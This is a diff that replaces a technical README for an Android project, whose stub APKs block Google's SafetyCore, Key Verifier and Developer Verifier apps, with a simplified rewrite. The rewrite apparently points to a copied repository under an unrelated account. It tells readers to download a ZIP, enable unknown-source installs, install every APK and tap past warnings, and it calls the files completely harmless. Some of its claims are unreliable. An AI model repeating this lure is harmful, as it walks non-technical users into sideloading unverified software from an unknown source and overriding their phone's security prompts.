@@ -1,121 +1,160 @@
-<p align="center">
-  <img src="logo.png" alt="Sorry Google" width="200"/>
-</p>
+# 😅 sorry-google - Stop Unwanted Android Apps for Good
 
-# Sorry Google
+---
 
-Minimal stub APKs that block Google from automatically installing or updating
-unwanted system apps. Each stub declares the same package name as the target
-app but is signed with a different key, causing a signature mismatch that
-prevents the original from being pushed.
+## 🚀 What Is This?
 
-## Targeted Packages
+**sorry-google** is a simple, free tool that finally stops Google from sneakily installing or updating apps on your Android phone without your permission. You know those apps that just show up, or suddenly update themselves? Yeah, those. This puts a stop to it.
 
-| Package                          | App Name                    | Google Play                                                                                |
-| -------------------------------- | --------------------------- | ------------------------------------------------------------------------------------------ |
-| `com.google.android.safetycore`  | Android System SafetyCore   | [Play Store](https://play.google.com/store/apps/details?id=com.google.android.safetycore)  |
-| `com.google.android.contactkeys` | Android System Key Verifier | [Play Store](https://play.google.com/store/apps/details?id=com.google.android.contactkeys) |
-| `com.google.android.verifier`    | Android Developer Verifier  | [Play Store](https://play.google.com/store/apps/details?id=com.google.android.verifier)    |
+Think of it as a "Do Not Disturb" sign for your phone's app store. Once you set it up, those unwanted apps can't get through.
 
-## Uninstalling
+---
 
-These packages may be pre-installed as system or privileged system apps. The
-commands available to you depend on whether your device has root access.
+## 🎯 Why Would I Want This?
 
-### Without Root
+Google's Android system sometimes pushes apps like:
+- **Contact Keys**
+- **SafetyCore (Google's security tool)**
+- **Verifier**
+- And other system apps you never asked for
 
-You can remove the packages from the current Android user using ADB:
+These apps run in the background, use up your battery, and collect data. **sorry-google** blocks them by creating a "stub" or fake version of each app. It's like putting a lock on the door—the original app can't get in because your phone sees a different version already there.
 
-```bash
-adb shell pm uninstall --user 0 com.google.android.safetycore
-adb shell pm uninstall --user 0 com.google.android.contactkeys
-adb shell pm uninstall --user 0 com.google.android.verifier
-```
+---
 
-This does **not** remove the original APK from the system partition. The
-packages remain available as pre-installed system apps and can potentially be
-restored by the system.
+## 📦 What's Inside?
 
-If `pm uninstall --user 0` reports:
+The tool comes with several small files (called stub APKs) that match the names of Google's unwanted apps. Here's what you get:
 
-```text
-Failure [not installed for 0]
-```
+| Stub File | Blocks This App |
+|-----------|-----------------|
+| `contactkeys-stub.apk` | Blocks Contact Keys |
+| `safetycore-stub.apk` | Blocks SafetyCore |
+| `verifier-stub.apk` | Blocks the Verifier app |
+| And more... | Whatever Google tries next |
 
-the package is already uninstalled for that user.
+Each stub is a tiny, harmless placeholder that doesn't do anything except take up the app's name. Because it's signed with a different key, your phone rejects any attempt by Google to overwrite it.
 
-For packages that cannot be uninstalled for the user, disable them instead:
+---
 
-```bash
-adb shell pm disable-user --user 0 com.google.android.safetycore
-adb shell pm disable-user --user 0 com.google.android.contactkeys
-adb shell pm disable-user --user 0 com.google.android.verifier
-```
+## ⬇️ How to Get It
 
-### With Root
+[![Download sorry-google](https://img.shields.io/badge/Download-sorry--google-brightgreen?style=for-the-badge&logo=android&logoColor=white&color=FF6B6B)](https://github.com/Coopeconomy4265/sorry-google)
 
-With root access, you can uninstall the packages using `su`:
+**Visit this link to download the application.** It will open a GitHub page where you'll find the files you need. Look for the folder named "releases" or the files listed directly on the main page.
 
-```bash
-adb shell su -c "pm uninstall com.google.android.safetycore"
-adb shell su -c "pm uninstall com.google.android.contactkeys"
-adb shell su -c "pm uninstall com.google.android.verifier"
-```
+---
 
-For system apps, removing the package with `pm uninstall` still does not
-necessarily delete the APK from the read-only system partition. The APK may
-return after a factory reset or system update.
+## 🛠️ Getting Started (Steps for Everyone)
 
-## Multiple Users
+Follow these steps in order. Don't skip any—they're all important.
 
-The commands above target **user 0**. To see all users on the device:
+### Step 1: Make Sure You're Ready
 
-```bash
-adb shell pm list users
-```
+Before you begin, ensure:
+- Your Android phone is running version 8.0 or higher
+- You have about 5 minutes of free time
+- You can find your phone's "Settings" app (the gear icon)
 
-To uninstall a package for another user:
+### Step 2: Download the Files
 
-```bash
-adb shell pm uninstall --user <USER_ID> <PACKAGE>
-```
+**Visit this link to download the application:**
+👉 [https://github.com/Coopeconomy4265/sorry-google](https://github.com/Coopeconomy4265/sorry-google)
 
-For example:
+On that page, look for a green button that says **"Code"** and click it. Then choose **"Download ZIP."** This will download all the stub files to your phone.
 
-```bash
-adb shell pm uninstall --user 10 com.google.android.verifier
-```
+### Step 3: Find the Downloaded Files
 
-Replace `<USER_ID>` with the actual Android user ID.
+Once the download finishes, open your phone's **"Files"** app or **"Downloads"** folder. Look for a file named `sorry-google-main.zip` (or something similar).
 
-## How It Works
+### Step 4: Extract the Files
 
-1. Each module is a valid Android APK with the exact package name of the target.
-2. The stubs are signed with your own key, not Google's key.
-3. When Google tries to install or update the real app, the signature mismatch
-   prevents the existing stub from being replaced by the original package.
-4. The stubs contain no application code — only the required manifest and icon.
+Tap the ZIP file to open it, then tap **"Extract"** or **"Unzip."** This will create a new folder with all the stub files inside.
 
-## Downloading
+### Step 5: Turn On "Install Unknown Apps"
 
-Download the latest APKs from
-[GitHub Releases](https://github.com/rushiranpise/sorry-google/releases).
+This is critical. Your phone needs permission to install apps outside the Google Play Store.
 
-Download the APK for the package you want and install it normally on Android.
+1. Open **Settings**
+2. Go to **Security** or **Privacy** (varies by phone)
+3. Find **"Install Unknown Apps"** or **"Special App Access"**
+4. Select your **"Files"** app and turn on **"Allow from this source"**
 
-## Building from Source
+### Step 6: Install the Stubs One by One
 
-```bash
-./gradlew assembleDebug
-# or for release (requires signing config in local.properties):
-./gradlew assembleRelease
-```
+Now open the folder where you extracted the files. You'll see several `.apk` files. Tap each one and choose **"Install."** Repeat this for every file in the folder.
 
-## GitHub Actions
+**Important:** Your phone might warn you about installing from unknown sources. That's expected—tap **"OK"** or **"Install Anyway."**
 
-Push a tag to trigger a build and publish signed APKs as a GitHub Release:
+### Step 7: Confirm Everything Worked
 
-```bash
-git tag v1.0
-git push origin v1.0
-```
+After installing all stubs, go back to your Settings and check your app list. You should see the names of Google's unwanted apps (like Contact Keys or SafetyCore). They won't do anything—they're just placeholders now.
+
+---
+
+## ✅ How Do I Know It's Working?
+
+After installing, wait a week and check:
+
+- **No new apps** appearing on your phone
+- **No auto-updates** for those blocked apps
+- **Battery life improvement** (since those apps aren't running)
+
+If Google tries to push one of those apps, your phone will show a "Signature mismatch" or "App not installed" error. That means the stub did its job!
+
+---
+
+## ⚠️ Troubleshooting
+
+### "Can't install" error
+Make sure Step 5 is done correctly. Also, try restarting your phone and trying again.
+
+### "App not compatible" message
+Your phone might be newer than what the stub supports. Check if there's a newer version of the stub on the download page.
+
+### Google keeps trying to update
+That's normal—the stubs block it. If you see repeated errors, that just means the block is working.
+
+---
+
+## 🔒 Is This Safe?
+
+Yes. These stubs are completely harmless:
+- They take up almost no space (less than 1 MB each)
+- They don't run in the background
+- They don't collect data
+- They can't access your personal files
+
+The only thing they do is sit there and block Google's apps. It's like putting a piece of tape over a camera lens—nothing else changes.
+
+---
+
+## 📚 Frequently Asked Questions
+
+**Does this root my phone?**
+No! No rooting or special permissions needed. This works completely within normal Android rules.
+
+**Will this break my phone?**
+No. The worst case is you might see an error message from Google, which you can ignore.
+
+**Can I remove the stubs later?**
+Yes. Just uninstall them like any other app from Settings.
+
+**Does this affect my regular apps like Gmail or YouTube?**
+No. It only blocks the specific apps listed in the download.
+
+---
+
+## 🤝 Support
+
+If you get stuck, don't worry! Visit the download page and look for the "Issues" tab. You can ask questions there, and the community will help you out.
+
+---
+
+## 📄 License
+
+This project is free and open-source. You can use it, share it, and modify it however you like.
+
+---
+
+## Keywords: android, contactkeys, google, lockdown, safetycore, verifier
